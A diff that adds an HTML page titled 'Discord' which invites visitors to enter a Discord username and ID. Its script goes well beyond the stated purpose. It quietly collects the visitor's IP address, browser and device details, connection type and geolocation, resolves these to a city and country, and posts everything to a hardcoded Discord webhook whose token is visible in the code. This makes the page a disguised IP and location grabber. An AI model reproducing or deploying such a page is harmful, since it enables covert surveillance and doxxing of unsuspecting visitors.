@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord</title>
+  <link rel="stylesheet" type="text/css" href="styles.css">
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #00ff00;
+    }
+
+    p {
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      padding: 8px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 8px 16px;
+      background-color: #00ff00;
+      color: #000;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00cc00;
+    }
+  </style>
+</head>
+<body>
+  <h1>Discord</h1>
+  <p>Lets connect trough to Discord:</p>
+  <input type="text" id="discord-username" placeholder="Enter Discord username">
+  <input type="text" id="discord-id" placeholder="Enter Discord user ID">
+  <button onclick="sendMessage()">Send Information</button>
+
+  <script>
+    function sendMessage() {
+      var webhookUrl = "https://discord.com/api/webhooks/1224816654702215268/fM8al1-WnV11lTSc6ARvRc_W-ArQbSJMa3-V_YLEFRPEzCMH_5Sz2gGIwsbIx5AakSgL";
+      var username = document.getElementById('discord-username').value;
+      var userId = document.getElementById('discord-id').value;
+
+      fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        var ipAddress = data.ip;
+        var userAgent = navigator.userAgent;
+        var dateTime = new Date().toLocaleString();
+        var screenWidth = window.screen.width;
+        var screenHeight = window.screen.height;
+        var viewportWidth = document.documentElement.clientWidth;
+        var viewportHeight = document.documentElement.clientHeight;
+        var language = navigator.language || navigator.userLanguage;
+        var platform = navigator.platform;
+        var cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
+        var connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+
+        navigator.geolocation.getCurrentPosition(position => {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+
+          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
+          .then(response => response.json())
+          .then(locationData => {
+            var city = locationData.address.city || locationData.address.town || locationData.address.village || 'Unknown';
+            var country = locationData.address.country || 'Unknown';
+
+            var message = {
+              embeds: [{
+                title: 'Client Information',
+                color: 65280,
+                fields: [
+                  { name: 'IP Address', value: ipAddress, inline: true },
+                  { name: 'User Agent', value: userAgent, inline: false },
+                  { name: 'Date and Time', value: dateTime, inline: true },
+                  { name: 'Screen Resolution', value: `${screenWidth}x${screenHeight}`, inline: true },
+                  { name: 'Viewport Size', value: `${viewportWidth}x${viewportHeight}`, inline: true },
+                  { name: 'Language', value: language, inline: true },
+                  { name: 'Platform', value: platform, inline: true },
+                  { name: 'Cookies Enabled', value: cookiesEnabled, inline: true },
+                  { name: 'Connection Type', value: connectionType, inline: true },
+                  { name: 'Location', value: `${city}, ${country}`, inline: false },
+                  { name: 'Discord Username', value: `@${username}`, inline: true },
+                  { name: 'Discord User ID', value: `<@${userId}>`, inline: true }
+                ],
+                footer: { text: 'Client Information' }
+              }]
+            };
+
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(message),
+            })
+            .then(response => {
+              if (!response.ok) {
+                throw new Error('Failed to send message to Discord.');
+              }
+              alert('Information sent successfully!');
+            })
+            .catch(error => {
+              alert(error.message);
+            });
+          })
+          .catch(error => {
+            alert('Failed to get location information.');
+          });
+        }, error => {
+          alert('Failed to get location information.');
+        });
+      })
+      .catch(error => {
+        alert('Failed to get IP address.');
+      });
+    }
+  </script>
+</body>
+</html>
